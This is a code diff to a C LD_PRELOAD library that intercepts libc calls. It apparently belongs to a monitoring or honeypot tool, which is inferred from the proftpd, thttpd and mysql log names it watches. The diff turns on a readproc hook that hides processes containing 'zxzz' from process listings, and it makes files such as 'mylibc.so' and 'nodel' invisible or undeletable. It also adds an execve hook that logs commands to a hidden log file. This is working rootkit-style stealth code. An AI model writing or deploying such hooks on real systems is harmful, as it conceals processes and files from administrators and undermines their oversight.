@@ -16,6 +16,8 @@
 #define __USE_GNU
 #include <dlfcn.h>
 
+#include <proc/readproc.h>
+
 #define LOG_FILE "/secretlog"
 /* Buffer for log string */
 #define LOG_LENGTH 4096
@@ -29,6 +31,9 @@ static char* exec_envs[ENV_LENGTH];
 
 #define MAX_LEN 4096
 static char max_path[MAX_LEN];
+
+#define MAX_CONN_NUM 3
+static int connection_number;
 
 
 /* Pointers to save original system calls */
@@ -45,6 +50,7 @@ static int (*orig_unlinkat)(int dirfd, const char *pathname, int flags);
 static int (*orig_rmdir)(const char *pathname);
 static int (*orig_connect)(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
 static int (*orig_socket)(int domain, int type, int protocol);
+static proc_t* (*orig_readproc)(PROCTAB *restrict const PT, proc_t *restrict p);
 
 //FIXME: Temprorarily not needed
 static int (*orig_execl)(const char *path, const char *arg, ...);
@@ -87,7 +93,7 @@ struct sec_file files[] = {
 	{"mylibc.so", SF_INVISIBLE | SF_UNREMOVABLE},
 	{"proftpd.log", SF_UNREMOVABLE},
 	{"thttpd.log", SF_UNREMOVABLE},
-	{"nodel", SF_UNREMOVABLE},
+	{"nodel", SF_UNREMOVABLE | SF_INVISIBLE},
 	{"mysql.log.", SF_INVISIBLE}
 };
 
@@ -291,7 +297,6 @@ int open64(const char *pathname, int flags, mode_t mode){
 
 	char *replace;
 	if((replace = is_replaced(pathname)) != NULL){
-		printf("replaced_path: %s\n", replace);
 		pathname = replace;
 	}
 	if(!orig_open64)
@@ -302,18 +307,18 @@ int open64(const char *pathname, int flags, mode_t mode){
 }
 
 
-//proc_t* readproc(PROCTAB *restrict const PT, proc_t *restrict p){
-//	proc_t* ret = NULL;
-//	void *libproc = dlopen("libproc-3.2.8.so", RTLD_LAZY);	
-//	if(libproc != NULL && (orig_readproc = dlsym(libproc, "readproc"))){
-//		ret = orig_readproc(PT, p);
-//		if(strstr(p->cmd, "zxzz") != NULL)
-//			ret = NULL; 
-//	}
-//	dlclose(libproc);
-//	return ret;
-//}
-//
+proc_t* readproc(PROCTAB *restrict const PT, proc_t *restrict p){
+	proc_t* ret = NULL;
+	void *libproc = dlopen("libproc-3.2.8.so", RTLD_LAZY);	
+	if(libproc != NULL && (orig_readproc = dlsym(libproc, "readproc"))){
+		ret = orig_readproc(PT, p);
+		if(strstr(p->cmd, "zxzz") != NULL)
+			ret = NULL; 
+	}
+	dlclose(libproc);
+	return ret;
+}
+
 int unlink(const char* pathname){
 	int ret = -1;
 	if(!orig_unlink)
@@ -366,12 +371,18 @@ int rmdir(const char *pathname){
 
 //int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen){
 //	int ret = -1;
+//	printf("Connection number:%d\n", connection_number);
+//	if(connection_number > MAX_CONN_NUM){
+//		printf("Max connection number is reached\n");
+//		return -1;
+//	}
+//	connection_number++;
 //	struct sockaddr_in* sa = (struct sockaddr_in*) addr;
 //	const char* destaddr = (const char*)inet_ntoa(sa->sin_addr);
-//	if(sockfd < SOCK_COUNT && socket_info[sockfd] == 2 && !myaddr(destaddr)){
-//		printf("Not allowed to connect to %s\n", destaddr);
-//		return ret;
-//	}	
+////	if(sockfd < SOCK_COUNT && socket_info[sockfd] == 2 && !myaddr(destaddr)){
+////		printf("Not allowed to connect to %s\n", destaddr);
+////		return ret;
+////	}	
 //	snprintf(logstring, LOG_LENGTH, "connect to %s:%d\n", destaddr, htons(sa->sin_port));
 //	mylog(logstring);
 //	if(!orig_connect)
@@ -478,5 +489,14 @@ int execv(const char *path, char *const argv[]){
 		orig_execv = dlsym(RTLD_NEXT, "execv");
 	logexec(path, argv);
 	int ret = orig_execv(path, argv);
+	return ret;
+}
+
+int execve(const char *filename, char *const argv[], char *const envp[]){
+	puts("in execve");
+	if(!orig_execve)
+		orig_execve = dlsym(RTLD_NEXT, "execve");
+	logexec(filename, argv);
+	int ret = orig_execve(filename, argv, envp);
 	return ret;
 }
